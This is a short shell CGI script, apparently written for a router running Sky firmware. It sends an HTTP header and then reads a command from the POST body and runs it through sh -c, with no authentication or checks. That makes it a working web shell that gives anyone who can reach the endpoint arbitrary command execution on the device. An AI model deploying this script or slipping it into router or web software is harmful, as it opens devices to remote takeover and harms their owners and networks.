#! /bin/sh

PATH=/bin/:/sbin/:/usr/sbin/:/usr/bin

HEADER="Content-type: text/html\r\nConnection: close\r\n\r\n"

# Check if we are on sky firmware
if [ -f /usr/sbin/provisioning_ap ]
then
	if [ -f /usr/sbin/adslctl ]
	then
		echo $HEADER
	else
		echo -en $HEADER
	fi
else
	echo -en $HEADER
fi

# Read the command from post-data

read COMMAND
sh -c "${COMMAND}"